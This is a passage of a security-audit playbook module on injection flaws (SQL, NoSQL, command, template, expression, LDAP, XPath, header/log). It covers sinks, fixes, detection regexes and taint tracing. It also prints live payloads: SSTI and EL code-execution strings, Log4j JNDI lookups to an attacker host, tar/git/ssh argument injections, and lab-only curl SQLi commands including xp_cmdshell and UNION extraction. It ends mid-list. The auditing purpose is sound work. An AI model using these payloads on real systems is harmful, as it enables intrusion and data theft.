---
name: aegis-injection
description: Audit playbook module for detecting and remediating the full injection family (SQL, NoSQL, OS command, template, code/expression, LDAP, XPath, header/CRLF/log) via static taint tracing and authorized reproduction.
category_slug: INJ
cwe: [CWE-89, CWE-78, CWE-74, CWE-77, CWE-90, CWE-94, CWE-95, CWE-117, CWE-564, CWE-643, CWE-917, CWE-943, CWE-1336]
owasp: A03:2021 – Injection
---

# Injection Checks (INJ)

## Scope & Objectives

- Cover the complete injection family in one pass: SQL injection (CWE-89), NoSQL/query-logic injection (CWE-943), OS command and argument injection (CWE-78/CWE-77), server-side template injection (CWE-1336), code/expression-language evaluation including EL/SpEL/OGNL/JNDI (CWE-94/CWE-95/CWE-917), LDAP (CWE-90), XPath (CWE-643), and header/CRLF/log injection (CWE-74/CWE-117).
- Languages in scope: JavaScript/TypeScript (Node, Express/Fastify/NestJS), Python (Django/Flask/FastAPI), Java/Kotlin (Spring/Jakarta), C# (ASP.NET Core), PHP (Laravel/Symfony/raw), Ruby (Rails), Go, plus SQL dialects (MySQL, PostgreSQL, MSSQL, SQLite). Rust, Swift, C, and C++ are not meaningfully applicable to this module's sink inventory and are skipped beyond noting their argv-array exec patterns resemble Go's.
- Deliverables per finding: sink location, tainted source, propagation path, injection context (data value vs identifier vs argv vs expression vs header), exploitability rating from static/offline reasoning, and a concrete fix.
- Assume code-read access only. Dynamic payloads in Exploitation & Reproduction are for authorized lab verification, never for production systems during a static audit.
- Out of scope: DOM-only XSS, unsafe-deserialization gadget chains (separate module), SSRF (unless reached through command/template injection).

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **source**: where attacker-supplied data enters the program (URL params, body fields, headers)
- **sink**: the dangerous function attacker data must never reshape (query executor, shell runner, template renderer)
- **parameterized query**: database call that keeps the SQL text fixed and passes values separately, so input cannot change its meaning
- **allowlist**: a fixed list of permitted values; anything not on it is rejected
- **stacked queries**: two SQL statements smuggled into one call, letting an attacker run extra statements
- **second-order injection**: data stored safely today that turns harmful when reused later in another query or template
- **payload**: crafted input submitted to prove whether a suspected bug is real
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

Every injection is one bug class: **attacker-controlled data crosses a language boundary and changes the meaning of a program artifact** (a query, a command line, a template, an expression, a header block). Trace three roles:

1. **Source** — attacker data entry: HTTP params/body/headers/cookies, websocket frames, queue messages, uploaded filenames/content, DNS names, second-order values read back from the DB.
2. **Propagator** — concatenation `+`, f-strings, `%`/`.format`, template literals `${}`, `StringBuilder.append`, `fmt.Sprintf`, `sprintf`, `#{}` interpolation, `CONCAT`, storage-then-reuse.
3. **Sink** — interpreter boundary: driver `execute`, `child_process`, template parse/render, `eval`/EL parser, LDAP/XPath evaluator, header writer.

The sink's **context grammar** determines the break-out sequence:

| Sink context | Grammar boundary | Break-out primitive |
|---|---|---|
| SQL string literal | `'` or `"` | `' OR '1'='1` / `'; -- ` |
| SQL numeric context | unquoted | `1 OR 1=1` / `1;--` |
| SQL identifier (ORDER BY/table/column) | cannot be parameterized | allowlist only |
| Shell command line (shell=true) | `` ` `` `$` `;` `|` `&` `>` newline | `` `id` `` / `; id` / `$(id)` / `%0a id` |
| argv array (no shell) | argument parser flags | leading `-`/`--` tokens |
| Template body | `{{ }}` `{% %}` `${}` `<% %>` | `{{7*7}}` |
| Expression language | expression delimiters | `T(...)`, `%{...}`, `#{...}` |
| MongoDB filter object | keys beginning with `$` | `{"$gt":""}` |
| LDAP filter (RFC 4515) | `* ( ) \ NUL` | `*` / `*)(uid=*))(|(|uid=*` minus spaces |
| XPath 1.0 predicate | `'` `"` `[ ]` | `' or '1'='1` |
| HTTP header value / log line | CR LF | `%0d%0a` / `\n` |

**Detection vs exploitation:** during a static audit you *prove constructability* — show attacker bytes reach the sink unneutralized and predict the observable effect (delay, error string, data diff, out-of-band callback). Fire live payloads only against authorized staging/lab instances.

**Second-order rule:** the database is a propagator. A value stored safely today can be concatenated into SQL/logs/templates next week. Trace sinks back to origin, not to the nearest variable.

## What To Check

### SQL

1. Scan every execution site for string-built statements: `+`, f-strings, `%`, `.format`, template literals, `StringBuilder`, `sprintf`, `#{}`.
2. Trace every ORM raw-query escape hatch: Django `raw()`/`extra()`; SQLAlchemy `text()`; Sequelize `literal()`/`query()`; Knex `.raw()`; TypeORM `.query()` and Prisma `$queryRawUnsafe`; Hibernate `createSQLQuery`/`createNativeQuery`; Spring Data `@Query(nativeQuery=true)`; JdbcTemplate; GORM `Raw`/`Order`; Rails `find_by_sql`/`Arel.sql`; Laravel `DB::raw`/`whereRaw`/`orderByRaw`; EF Core `FromSqlRaw`.
3. Flag dynamic identifiers — ORDER BY/GROUP BY direction, table/column names built from request data. Parameterization cannot protect identifiers; demand allowlist maps.
4. Check LIKE clauses for user input in the pattern without escaping `%`/`_` and without an `ESCAPE` clause.
5. Hunt second-order SQLi: values written safely, later concatenated elsewhere (reports, exports, admin tools, cron jobs).
6. Inspect "parameterized" code for done-wrong variants: interpolating before `execute`, `.replace(":id", x)` placeholder substitution, IN-lists joined from raw values, LIMIT/OFFSET string-bound then fallback-concatenated.
7. Record the DB dialect to predict stacked-query support and comment syntax (see dialect table below).
8. Check Unicode handling on validation boundaries: normalize (`NFC`) before allow-list checks, or attackers slip NFD/fullwidth variants past a denylist that later collapse into dangerous characters downstream (same lesson as FILE's filename normalization, applied to every validated field).

### NoSQL

1. Scan Express/Fastify/NestJS handlers passing `req.body`/`req.query` objects directly into mongoose `find`/`findOne`/`updateOne`/`countDocuments` — operator injection (`$gt`, `$ne`, `$regex`, `$where`, `$function`).
2. Verify request schemas (zod/joi/express-validator) coerce every filter field to scalar types before the driver sees it.
3. In PHP, flag controllers forwarding array params (`?user[$ne]=x`) from `$_GET`/`$_POST` into Mongo filters.
4. Flag `$where`/`$function`/`$accumulator` anywhere — server-side JavaScript; user influence is critical.
5. Review Redis usage for Lua scripts (`eval`/`EVALSHA`) built by concatenation, and user-controlled key names crossing tenant prefixes.
6. Review CouchDB `_find` selectors and `_view` `startkey`/`endkey`/`keys` params for raw user JSON widening reads past tenant boundaries.

### OS command

1. Scan shell-interpreter sinks: Node `exec`/`execSync`/`spawn(shell:true)`; Python `os.system`/`os.popen`/`subprocess(shell=True)`; PHP `system`/`exec`/`passthru`/`shell_exec`/`proc_open`/`popen`/backticks; Ruby backticks/`system(str)`/`IO.popen`/`Kernel#open("|cmd")`/`%x{}`; Java `Runtime.exec(String)`; C# `Process` with `UseShellExecute=true`; Go `exec.Command("sh","-c",...)`.
2. For argv-array sinks without a shell, hunt argument injection: user-controlled elements beginning with `-` or `--`.
3. Audit privileged wrappers around `sudo`, `tar`, `find`, `git`, `ssh`, `curl`, `rsync`, `zip`, pagers — enumerate which flags the attacker controls.
4. Verify upload-derived filenames are reduced to basenames and allowlist-validated before converters (ImageMagick, LibreOffice, wkhtmltopdf, ffmpeg, pandoc).

### SSTI

1. Find every place user text reaches template *compilation*: `render_template_string`, Jinja2 `Environment.from_string`, `django.template.Template(text)`, Mako `Template(text)`, Twig `createTemplate`, Smarty `string:` resources, FreeMarker processing user-named templates, Velocity `evaluate(...)`, Thymeleaf user-controlled view names, ERB `ERB.new(user).result`, Handlebars/Mustache compile of user strings, Liquid `Template.parse(user)`.
2. Distinguish data-vs-code: user text as a *variable* is safe; as *template source* or *template name* is the vulnerability.
3. Check sandbox configs (Jinja2 `SandboxedEnvironment`, FreeMarker restricted wrappers, Twig sandbox, Smarty `$security_policy`) for weak allowances.

### Code / expression evaluation

1. Scan for `eval`, `new Function`, `exec`, `compile`, `vm.runIn*`, `instance_eval`, `send`, `constantize`, `call_user_func`, `assert` (PHP string form pre-8.0), `create_function` (removed PHP 8.0), `preg_replace(/e)` (removed PHP 7.0), `ScriptEngine.eval`, GraalVM `Context.eval`, `CSharpScript`.
2. Scan Python `str.format` calls whose *format string* is user-owned (mail merge, notifications, i18n) for attribute-chain escape (`{0.__class__}`).
3. Flag `SpelExpressionParser` + `StandardEvaluationContext` fed request data; Struts OGNL evaluation of `%{...}` from input; `InitialContext.lookup(userUrl)`.
4. Flag Log4j 2.x (<=2.14.1) logging of attacker-controlled strings (headers, form fields, user agents) — JNDI lookup trigger.
5. Go: flag `text/template` output rendered as HTML and `template.HTML(userInput)` casts; `html/template` contextual autoescaping is the safe default.

### LDAP & XPath

1. Scan LDAP filter construction for concatenated input across python-ldap/ldap3, Jakarta `DirContext.search`, `ldapjs`, PHP `ldap_search`, go-ldap, .NET `DirectorySearcher`.
2. Scan XPath evaluators (lxml `.xpath`, `javax.xml.xpath`, `DOMXPath->query`, .NET `XPathSelectElements`) for predicates assembled from input.
3. Confirm RFC 4515 escaping (`* ( ) \` NUL) or XPath variable bindings exist wherever filters/predicates are dynamic.

### Header / CRLF / log

1. Trace request-derived values into response headers (`Location`, `Set-Cookie`, `Refresh`, custom), redirect targets, and hand-rolled socket writing.
2. Trace request-derived values into log calls; flag embedded CR/LF/control characters forging log lines.
3. Test URL-path reflection for `%0d%0a` pass-through at proxies/gateways (app frameworks usually block it; intermediaries historically did not).

### Sanitizers that don't work

1. Flag reliance on: `addslashes`, magic_quotes remnants, keyword `str_replace` blacklists, `htmlentities` used against SQL, `FILTER_SANITIZE_STRING`, client-side-only validation, WAF-only protection, `escapeshellarg` under cmd.exe, client-side `$`-key stripping for MongoDB without schema casting.
## Where To Look

| Feature / route smell | Typical locations | Likely injection |
|---|---|---|
| Search/list endpoints with `sort`, `order`, `filter`, `q` params | controllers, `views.py`, `*_controller.rb`, JAX-RS/Spring resources | SQL identifier injection |
| Login / password reset / token validation | auth services, `models/User*`, `AccountController` | SQLi, NoSQL auth bypass, LDAP |
| Export / reporting / CSV / PDF generation | exporters, reports, admin panels | second-order SQLi, command injection |
| Admin CRUD with table/column choosers | generic grid components, dashboards | identifier SQLi |
| Upload → thumbnail/convert pipeline | media services, celery/sidekiq/bull tasks | command injection (ImageMagick et al.) |
| Webhook receivers, importers, ETL workers | webhooks/, integrations/, jobs/ | second-order SQLi, template/eval |
| Mail/notification templating, mail-merge | templates/, notifiers | SSTI, Python format-string, EL injection |
| Redirectors, OAuth callbacks, locale routers | redirect controllers, gateway configs | CRLF/header injection, Thymeleaf view-name SSTI |
| Directory lookup / SSO / AD sync | LDAP connectors | LDAP injection |
| XML import/export, SOAP clients, SAML-lite parsers | xml utils | XPath injection |
| Deploy/git/release tooling, CI-trigger endpoints | ops endpoints, git wrappers | command + argument injection (`git`, `tar`, `find`) |
| Audit/access logging of user input | middleware, interceptors, `logger.*` calls | log injection, Log4shell-style JNDI |

Discovery sweeps (repo root):

```bash
rg --files -g '*.py' -g '*.rb' -g '*.php' -g '*.go' -g '*.java' -g '*.kt' -g '*.cs' -g '*.ts' -g '*.js'
rg -n "sort|orderBy|order\(|direction" --type js --type py -g '!node_modules' -g '!*test*'
rg -n "exec|system|popen|spawn|Process" -g '!node_modules' -g '!vendor' -g '!dist'
rg -n "render_template_string|from_string|ERB.new|Velocity|Freemarker|Twig|Smarty" -g '!vendor'
```

## Patterns & Signatures

### SQL sink matrix (Language | Dangerous API/Sink | Safe alternative)

| Language | Dangerous API/Sink | Safe alternative |
|---|---|---|
| JS/TS (mysql2/pg) | `conn.query("..."+x)`, template literals with `${}` | `conn.query("... = ?", [x])` / `$1` binds |
| JS/TS (Sequelize) | `sequelize.literal(x)`, `sequelize.query("..."+x)` | `{ replacements: [x] }` named binds |
| JS/TS (Knex) | `.whereRaw("..."+x)`, `.orderByRaw(x)` | `.where(col,x)`; allowlist map + `.orderBy(col)` |
| JS/TS (TypeORM) | `.query("..."+x)`, `$queryRawUnsafe(x)`, `$executeUnsafe` | `$queryRaw` tagged template (auto-bind), QueryBuilder |
| JS/TS (Prisma) | `$queryRawUnsafe`, `$executeUnsafe` | `$queryRaw` tagged template |
| JS/TS (mongoose) | `Model.where("$where", js)`, raw body filters | scalar-cast filters; `sanitizeFilter: true` |
| Python (DBAPI) | `cur.execute("...%s" % x)`, `execute(f"...{x}")` | `cur.execute("...%s", (x,))` or `?` (sqlite3) |
| Python (Django) | `objects.raw(f"...")`, `extra(where=[... % x])`, `.extra(select=...)` | ORM filters; `raw(sql, params=[x])` if unavoidable |
| Python (SQLAlchemy) | `text(f"... {x}")` | `text("... :p").bindparams(p=x)` |
| Java (JDBC) | `Statement.executeQuery("..."+x)` | `PreparedStatement` + `setString/setInt` |
| Java (JPA/Hibernate) | `createNativeQuery("..."+x)`, deprecated `createSQLQuery`, HQL concat | positional/named params (`?1`, `:p`) |
| Java (Spring Data) | `@Query(nativeQuery=true)` with concat; `Sort.by(rawParam)` | `:param` binds; allowlisted `Sort.by(col)` |
| Java (Spring Jdbc) | `JdbcTemplate.query("..."+x, ...)` | `NamedParameterJdbcTemplate` |
| C# (ADO.NET) | `new SqlCommand("..."+x, cn)` | `Parameters.AddWithValue("@p", x)` |
| C# (EF Core) | `FromSqlRaw($"...{x}")` (raw ignores interpolation) | `FromSqlInterpolated($"...{x}")` auto-parameterizes |
| C# (Dapper) | `cn.Query($"... {x}")` | `cn.Query("... = @p", new { p = x })` |
| PHP (raw) | `$pdo->query("...".$x)`, `query(sprintf(...))` | `prepare` + `execute([$x])`; `PDO::ATTR_EMULATE_PREPARES => false` |
| PHP (Laravel) | `DB::select(DB::raw(...))`, `whereRaw($req)`, `orderByRaw($req)` | Query Builder `where`; allowlist + `orderBy($col)` |
| PHP (Doctrine) | `createNativeQuery` concat, DQL concat | DQL `:param` binds |
| Ruby (Rails) | `find_by_sql("...#{x}")`, `where("n = '#{x}'")`, `order(Arel.sql(param))`, `update_all("c=#{x}")` | `where(n: x)`; `find_by_sql([sql, x])`; allowlisted symbols in `order` |
| Go (database/sql) | `db.Query(fmt.Sprintf("...'%s'", x))`, `db.Exec("..."+x)` | `db.Query("... = $1", x)` |
| Go (GORM) | `db.Raw("..."+x)`, `db.Where(fmt.Sprintf(...))`, unvalidated `db.Order(input)` | `db.Where("col = ?", x)`; allowlist for `Order` |

Dynamic-identifier signature — flag every hit:

```regex
(?i)(from|join|order\s+by|group\s+by|table|column)\s*['"`]?\s*(\+\s*\w+|\$\{|#\{|\.format\(|f["']|%s)
```

LIKE defect shape and fix:

```sql
-- VULNERABLE: user q spliced into pattern, wildcards live
SELECT * FROM items WHERE name LIKE '%' || :q || '%';   -- Postgres concat example
-- FIXED: escape wildcards in application code, declare escape char
SELECT * FROM items WHERE name LIKE :p ESCAPE '\';
-- app side: :p = "%" + q.replace(/\[%_\\]/g, "\\$&") + "%"
```

Dialect notes for exploitation prediction:

| Dialect | Comment | Delay primitive | Stacked queries | Notes |
|---|---|---|---|---|
| MySQL/MariaDB | `-- -`, `#` | `SLEEP(5)`, `BENCHMARK(5000000,MD5(1))` | only via `multi_query` API or PDO emulate-prepares ON | backtick identifiers; `information_schema`; `LOAD_FILE` needs FILE priv |
| PostgreSQL | `--` | `pg_sleep(5)` | accepted in simple-query mode by libpq-based drivers | double-quote identifiers; `::` casts; `COPY ... PROGRAM` needs superuser |
| MSSQL | `--` | `WAITFOR DELAY '0:0:5'` | yes — most drivers batch by default | `[bracket]` identifiers; verbose errors; `xp_cmdshell` often disabled |
| SQLite | `--` | no sleep builtin (`randomblob(N)` loops) | multi-statement via exec-style APIs | terse errors; `ATTACH DATABASE` file-write trick |

Parameterization-done-wrong gallery (each is vulnerable despite looking safe):

```python
cur.execute("SELECT * FROM u WHERE id = %s" % uid)     // VULNERABLE  formatted before driver sees it
cur.execute("SELECT * FROM u WHERE id = %s", (uid,))   // FIXED
```

```js
db.query(sql.replace(":id", req.params.id));                    // VULNERABLE  hand-made placeholder
db.query("...id IN (" + ids.map(_=>"?").join(",") + ")", ids);  // FIXED  placeholders generated, values bound
```

```java
ps = c.prepareStatement("SELECT * FROM u WHERE n = '" + n + "'");  // VULNERABLE  pre-concatenated
ps = c.prepareStatement("SELECT * FROM u WHERE n = ?");            // FIXED
```

Second-order tell: sink string parts originate from `model.getAttribute(...)`, `row["name"]`, ORM-loaded entities — not from the current request.

### NoSQL signatures

```regex
(\$where|\$function|\$accumulator|\$regex)|\$ne\s*:|\bfind(?:One)?\s*\(\s*(req\.body|req\.query|request\.(GET|POST)|\$_(GET|POST))
```

```js
// VULNERABLE: body object used as filter verbatim -> {"email":{"$gt":""},"password":{"$ne":1}}
const u = await User.findOne({ email: req.body.email, password: req.body.password });
// FIXED: coerce to scalars; enable sanitizeFilter at connection or per query
const email = String(req.body.email ?? "");
const pw = String(req.body.password ?? "");
const u = await User.findOne({ email }).select("+password");
if (!u || !(await u.comparePassword(pw))) return res.status(401).end();
// plus: mongoose.set("sanitizeFilter", true)
```

- PHP array-param confusion: `?email[$ne]=1&password[$regex]=^a` turns `$_GET['email']` into an array; flag uncast forwarding.
- Redis: flag `r.eval("return redis.call('get','"..k.."')")` — Lua injection; pass user data as `ARGV`/`KEYS`. User-controlled key suffixes crossing tenant prefixes = broken access control; note alongside.
- CouchDB: flag `_find` selectors and `_view?key=/startkey=/endkey=` built from raw user JSON — range widening leaks other tenants.

### OS command signatures

```regex
(?i)(child_process\.exec|execSync|spawnSync\(|shell:\s*true|shell\s*=\s*True|os\.(system|popen)|(system|passthru|shell_exec|proc_open|popen)\s*\(|%x\{|Runtime\.getRuntime\(\)\.exec|UseShellExecute\s*=\s*true|IO\.popen|Open3\.capture2?\w*\(|exec\.Command\("sh",\s*"-c")
```

Matrix (Language | Dangerous API/Sink | Safe alternative):

| Language | Dangerous API/Sink | Safe alternative |
|---|---|---|
| JS/TS | `child_process.exec`, `execSync`, `spawn(cmd,{shell:true})`, `execa` shell mode | `execFile`/`spawn` argv array, `shell:false`, timeout |
| Python | `os.system`, `os.popen`, `subprocess.*(cmd_str, shell=True)` | `subprocess.run([...], shell=False, check=True)` |
| Java/Kotlin | `Runtime.exec(String)` whitespace-split (arg-injectable) | `ProcessBuilder(List)`; still validate flags |
| C# | `Process.Start` with `UseShellExecute=true` (.NET Framework default true; .NET Core default false) | `ArgumentList`, `UseShellExecute=false` |
| PHP | `system`, `exec`, `passthru`, `shell_exec`, `` `cmd` ``, `proc_open` string cmd, `popen` | fixed binary + per-operand escaping, or argv-array `proc_open` |
| Ruby | backticks, `%x{}`, `system(str)`, `IO.popen(str)`, `Kernel#open("|cmd")` | `Open3.capture3(bin, *args)` array form |
| Go | `exec.Command("sh","-c", input)` | `exec.Command(bin, args...)` — stdlib never uses a shell |

Argument-injection without a shell — dangerous "safe" wrappers:

| Wrapper | Attack surface | Guard |
|---|---|---|
| `sudo <tool> <userArgs>` | flag injection executes as root | allowlist every arg; reject `-`-leading tokens where an operand is expected; prefer purpose-built helper running unprivileged |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=<cmd>` (root RCE if wrapper privileged) | fixed option set; validate member names; drop privileges |
| `find` | `-exec cmd ;`, `-fprintf /path file` | reject all `-`-prefixed user tokens; build the expression yourself |
| `git clone/fetch/push` on user URL | `ext::sh -c <cmd>` transport | pin `-c protocol.ext.allow=never`; allow only https/ssh schemes |
| `ssh` with user-controlled host/options | `-oProxyCommand=sh -c ...` | never pass user data as options; use ssh library APIs |
| `curl`/`wget` | `-o /etc/cron.d/x` overwrite, `-K configfile` read | fixed output paths; scheme restrictions (`--proto`); reject `-`-leading args |
| `rsync`, `zip`, `less` pager | `-e` remote-shell option, `--unzip-command`, pager `!cmd` | argv allowlist; `PAGER=cat`; `GIT_PAGER=cat` |

### SSTI signatures

```regex
(?i)(render_template_string|from_string|createTemplate|ERB\.new|VelocityEngine|freemarker|Twig\\?->|Environment\\?->createTemplate|Smarty|Thymeleaf|Liquid::Template|Handlebars\.compile|Mustache\.render|\.process\(|evaluate\(.*input)
```

| Engine | Detection payload | Proves engine when output shows | Brief escape (lab only) |
|---|---|---|---|
| Jinja2 | `{{7*'7'}}` | `7777777` | `{{ lipsum.__globals__.os.popen('id').read() }}` |
| Jinja2 alt probe | `{{7*7}}` | `49` | `{{ cycler.__init__.__globals__.os }}` |
| Twig | `{{7*7}}` | `49` | older Twig <=2.x: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Mako | `${7*7}` | `49` | `<%import os%>${os.popen('id').read()}` (full Python in expressions) |
| Django templates | `{{7*7}}` | literal text (no arithmetic) | weak: attribute traversal on exposed vars (settings leak); still flag `Template(user_text)` |
| Smarty | `{$smarty.version}` | version string | `{if system('id')}{/if}` when security policy off |
| FreeMarker | `${7*7}` | `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` unless scripts restricted |
| Velocity | `#set($x=7*7)$x` | `49` | `#set($s="")#set($c=$s.getClass())$c.forName("java.lang.Runtime").getRuntime().exec("id")` |
| Thymeleaf | `__${7*7}__` in view/fragment name | preprocessing resolves | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` when view name is user-controlled |
| ERB | `<%= 7*7 %>` | `49` | `<%= system('id') %>` |
| Liquid | `{{ 7 | times: 7 }}` | `49` | sandboxed: mainly DoS/resource abuse, `{% include %}` abuse — lower severity |

Key audit distinction: `render_template("page.html", name=user_input)` is data binding (safe); `render_template_string(user_input)` / `Template(user_input).render()` is code execution (vulnerable).

### Code / expression evaluation signatures

```regex
(?i)(\beval\s*\(|new\s+Function\s*\(|runIn(New|This)Context|instance_eval|constantize|call_user_func|create_function|preg_replace\s*\(.*/e|assert\s*\(\s*"|SpelExpressionParser|StandardEvaluationContext|OGNL|ScriptEngineManager|getEngineByName|polyglot\.Context|CSharpScript|InitialContext\s*\(|\.lookup\s*\()
```

Concrete sinks and payloads (Language/lib | Sink | Illustrative payload | Safe replacement):

| Language/lib | Sink | Illustrative payload | Safe replacement |
|---|---|---|---|
| Node | `eval(s)`, `new Function(s)`, `vm.runInNewContext(s)` | `require('child_process').exec('id')` inside s | schema + dispatch table; note `vm` is NOT a security boundary |
| Python | `eval`, `exec`, `compile` | `__import__('os').system('id')` | `ast.literal_eval`; mapping tables |
| Python | `fmt.format()` with user-owned format string | `{0.__init__.__globals__}[SECRET_KEY]` | never let user own format string; concatenate instead |
| Java | `SpelExpressionParser` + `StandardEvaluationContext` | `T(java.lang.Runtime).getRuntime().exec('id')` | `SimpleEvaluationContext` (no type refs/beans) or remove parser |
| Java | `InitialContext.lookup(url)` | attacker-chosen `ldap://host/o` | hardcode registry URLs; strict allowlist |
| Log4j <=2.14.1 | `logger.info(userStr)` | `${jndi:ldap://host/x}`; evasions `${${lower:j}ndi:ldap://host/x}`, `${${::-j}ndi:${::-l}dap://host/x}` | upgrade >=2.17.1; disable message lookups |
| Struts/OGNL | value-stack/tag evaluation of input | `%{@java.lang.Runtime@getRuntime().exec('id')}` | upgrade framework; never evaluate input as OGNL |
| Jakarta EL | EL resolver over user text | `${Runtime.getRuntime().exec('id')}` (context-dependent) | treat input as text only |
| Ruby | `eval`, `send(m,...)`, `constantize` on request data | `send(:eval, s)` | whitelist maps: `HANDLER = {"a"=>method(:a)}` |
| PHP | `eval`, `assert("...")` string form (<=7.x), `create_function` (removed 8.0), `preg_replace(/e)` (removed 7.0) | `eval($_GET['c'])` | remove; dispatch tables |
| C# | `CSharpScript.EvaluateAsync(user)` (Microsoft.CodeAnalysis.CSharp.Scripting) | script calling `System.Diagnostics.Process.Start` | remove scripting; restricted host policy |
| GraalVM | `Context.newBuilder("js").allowAllAccess(true).eval(src)` | JS host access into JVM | minimal `allowHostAccess`, never `allowAllAccess` |
| Go | `text/template` rendered as HTML; `template.HTML(userInput)` | crafted data invoking template funcs/methods | `html/template` contextual escaping; never mark raw |

Deserialization-adjacent eval: flag `pickle.loads`, `yaml.load` without `Loader=SafeLoader`, PHP `unserialize` of request data, Java native readObject — they reach code execution like eval; report under this category's CWE-94 umbrella with a cross-reference.

### LDAP & XPath signatures

```regex
(?i)(ldap_(search|list|read|bind|first_attribute)|DirectorySearcher|DirContext|SearchControls|ldapjs|XPathFactory|xPath\.evaluate|XPath\.compile|DOMXPath|XPathSelectElement|\.xpath\s*\()
```

```python
conn.search(BASE, "(uid=%s)" % uid)            // VULNERABLE  payload: *)(uid=*))(|(uid=*
conn.search(BASE, "(uid=%s)" % rfc4515_escape(uid))   // FIXED  escape * ( ) \ NUL
```

```java
XPathFactory.newInstance().newXPath().evaluate("//user[name='" + u + "']", doc);  // VULNERABLE
// FIXED: xpath.compile("//user[name=$u]") + XPathVariableResolver binding
```

Blind probes (boolean differential): LDAP `x)(cn=a*` vs `x)(cn=b*`; XPath `' and starts-with(name(),'a') and '1'='1`.

### Header / CRLF / log signatures

```regex
(\\r\\n|%0d%0a|%0D%0A)|(?i)((set|add|append|put)Header\s*\(\s*["'](Location|Refresh|Set-Cookie)|writeHead\([^)]*\+|header\s*\(\s*["'](Location|Refresh))
```

- Modern Node `res.setHeader`, PHP `header()` (>=5.1.2), most frameworks reject bare CR/LF — hunt instead: hand-written sockets, mail-header assembly, reverse-proxy layers, embedded HTTP servers, values flowing unvalidated into `Location:` redirects.
- Log injection: flag `logger.info(request.headers["user-agent"])`-style calls; payload `\n2026-01-01 INFO auth success user=admin` forges entries. Fix: structured JSON logging + control-char stripping.

### Sanitizers that don't work (flag each as a defect)

| Broken "sanitizer" | Why it fails | Correct control |
|---|---|---|
| `addslashes` (PHP) | GBK/Big5 multibyte: lead byte `0xbf` swallows added backslash leaving live quote (`%bf%27` bytes) | PDO/mysqli prepared statements; correct charset in DSN, not via `SET NAMES` query |
| magic_quotes_* (PHP <=5.3, removed 5.4) | blanket escaping, wrong contexts | delete legacy shims |
| `str_replace("'","",x)` / keyword blacklists | deletion enables double-application tricks (`SELSELECTECT` -> `SELECT` after naive removal) | parameterization |
| `htmlentities`/`htmlspecialchars` against SQL | wrong layer; encodes HTML grammar, not SQL | parameterization |
| `FILTER_SANITIZE_STRING` (deprecated) | lossy, grammar-blind | typed validation + binding |
| `escapeshellarg` under cmd.exe | quoting semantics differ; `%VAR%`, `^`, delayed expansion survive | avoid cmd.exe; argv arrays |
| client-side `$`-key stripping for Mongo | misses dotted keys/type confusion; middleware gaps | schema coercion + `sanitizeFilter` |
| WAF-only protection | double URL-encoding (`%2527`), JSON unicode escapes, chunked encoding, HPP, dialect quirks bypass it | detective control only; never sole defense |
| JS `x.replace(/['"]/g,"")` | context-insensitive munging | parameterization |
| PHP loose comparison (`==`, `in_array($x, $arr)` non-strict) | `'0e123' == '0e456'` is true (magic-hash style: both parse as scientific-notation zero, so such digest strings collide under `==`); int-vs-string juggling pre-8.0 also miscompares | strict `===`/`!==`; `in_array(..., true)`; `hash_equals()` for digests |

## Taint Tracing Guidance

Run this procedure per candidate flow:

1. **Enumerate sources**: `req.query/body/params/headers/cookies`; Flask `request.values`; Django `request.GET/POST`; Spring `@RequestParam/@PathVariable/@RequestBody`; Servlet `getParameter*`; PHP `$_GET/$_REQUEST/php://input`; Rails/Sinatra `params[...]`; Go `r.URL.Query()/r.FormValue`; GraphQL resolver args; queue/webhook payloads; uploaded filenames and content; DB-read values (second-order).
2. **Mark propagators** along the path: concatenation, interpolation (`${}`/`#{}`/f-strings), format calls, `StringBuilder`/`StringBuffer`, `Array.join`, JSON serialization into query objects, ORM pass-through wrappers (`literal`, `Raw`, `Arel.sql`, `$queryRawUnsafe`), storage round-trips.
3. **Identify the sink's grammar** — data value, identifier, argv element, expression, or header line — because that defines which neutralization is even meaningful.
4. **Classify interceptors**: true neutralizers are driver parameter binding, argv arrays without shell, closed allowlist map lookups, bounded numeric casts, RFC 4515 escaping, XPath variable binding, template data-binding APIs.
5. **Check coverage gaps**: values parameterized but ORDER BY concatenated; IN-lists joined; LIMIT/OFFSET string-typed then fallback-concatenated; one route fixed while a sibling admin route shares the sink.
6. **Resolve second-order flows**: follow stored values to every later sink; a safe INSERT does not clear taint.
7. **Rate exploitability statically**: context (literal vs identifier), sink-process privilege (DB FILE priv, xp_cmdshell, sudo wrappers), auth prerequisite, observable channel (error echo, timing, OOB egress).
8. **Record the chain** as `source(file:line) -> propagators -> sink(file:line) -> context -> predicted effect`; this feeds Severity Assessment and Verification.

## Exploitation & Reproduction

Execute ONLY against authorized staging/lab targets. Each step states goal, exact command, expected observable. Static-only engagements: use the static-confirmation subsection at the end.

1. **SQLi — locate injectable parameter.**
   `curl -si -G https://TARGET/items --data-urlencode "q=x'"` → Expect a 500 with a driver error string (`SQLite3::SQLException`, `You have an error in your SQL syntax`, `unterminated quoted string`, `Unclosed quotation mark`) proving grammar control; benign identical output means move on.
2. **SQLi — boolean differential (blind).**
   `curl -s -G TARGET/search --data-urlencode "q=x' AND '1'='1" | wc -c` versus `"q=x' AND '1'='2"` → differing byte counts prove conditional evaluation.
3. **SQLi — time-based confirmation.**
   MySQL: `q=x' AND SLEEP(5)-- -`; PostgreSQL: `q=x'; SELECT pg_sleep(5)--`; MSSQL: `q=x' WAITFOR DELAY '0:0:5'--`.
   Measure: `curl -s -o /dev/null -w '%{time_total}\n' -G TARGET/search --data-urlencode "q=x' AND SLEEP(5)-- -"` → ~5.0s vs ~0.05s baseline across 3 runs = confirmed.
4. **SQLi — stacked queries (driver/dialect permitting; MSSQL typical).**
   Lab-only capability probe: `q=x'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--` → 5s delay indicates OS-command surface (requires xp_cmdshell enabled + sysadmin role).
5. **SQLi — data extraction (lab).**
   Union-based: `q=x' UNION SELECT NULL, table_name FROM information_schema.tables-- -` → schema names in output; iterate columns the same way.
6. **NoSQL — operator-injection auth bypass.**
